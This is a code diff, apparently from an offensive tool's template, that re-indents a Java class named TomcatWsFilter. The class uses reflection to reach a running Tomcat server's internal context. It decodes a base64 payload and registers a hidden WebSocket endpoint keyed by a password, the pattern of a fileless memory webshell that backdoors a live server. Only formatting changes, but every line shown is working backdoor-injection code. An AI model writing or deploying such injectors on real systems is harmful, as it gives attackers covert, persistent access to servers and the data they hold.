@@ -71,7 +71,7 @@ public class TomcatWsFilter extends Endpoint
     }}
 
     private Object invokeMethod(
-            Object obj, String methodName, Object... args
+        Object obj, String methodName, Object... args
     ) {{
         ArrayList clazzs = new ArrayList();
         if (args != null) {{
@@ -86,8 +86,8 @@ public class TomcatWsFilter extends Endpoint
             }}
         }}
         Method method = getMethod(
-                obj.getClass(), methodName,
-                (Class[]) clazzs.toArray(new Class[]{{}})
+            obj.getClass(), methodName,
+            (Class[]) clazzs.toArray(new Class[]{{}})
         );
         try {{
             return method.invoke(obj, args);
@@ -98,8 +98,8 @@ public class TomcatWsFilter extends Endpoint
 
     private Object getStandardContext() {{
         return invokeMethod(
-                getFieldValue(getLoader(), "resources"),
-                "getContext"
+            getFieldValue(getLoader(), "resources"),
+            "getContext"
         );
     }}
 
@@ -109,17 +109,17 @@ public class TomcatWsFilter extends Endpoint
         try {{
             base64 = Class.forName("java.util.Base64");
             Object decoder = base64.getMethod("getDecoder", null)
-                    .invoke(base64, null);
+                .invoke(base64, null);
             bytes = (byte[]) decoder.getClass()
-                    .getMethod("decode", new Class[] {{String.class}})
-                    .invoke(decoder, new Object[] {{payload}});
+                .getMethod("decode", new Class[] {{String.class}})
+                .invoke(decoder, new Object[] {{payload}});
         }} catch (ClassNotFoundException e) {{
             try {{
                 base64 = Class.forName("sun.misc.BASE64Decoder");
                 Object decoder = base64.newInstance();
                 bytes = (byte[])decoder.getClass()
-                        .getMethod("decodeBuffer", new Class[] {{String.class}})
-                        .invoke(decoder, new Object[] {{payload}});
+                    .getMethod("decodeBuffer", new Class[] {{String.class}})
+                    .invoke(decoder, new Object[] {{payload}});
             }} catch (Exception ex) {{}}
         }} catch (Exception ex) {{}}
         return bytes;
@@ -145,12 +145,12 @@ public class TomcatWsFilter extends Endpoint
 
     private void addWsFilter() throws DeploymentException {{
         ServletContext servletContext = (ServletContext) invokeMethod(
-                getStandardContext(), "getServletContext"
+            getStandardContext(), "getServletContext"
         );
         ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder
-                .create(TomcatWsFilter.class, password).build();
+            .create(TomcatWsFilter.class, password).build();
         ServerContainer container = (ServerContainer) servletContext
-                .getAttribute(ServerContainer.class.getName());
+            .getAttribute(ServerContainer.class.getName());
         if (servletContext.getAttribute(password) == null){{
             container.addEndpoint(configEndpoint);
             servletContext.setAttribute(password, password);
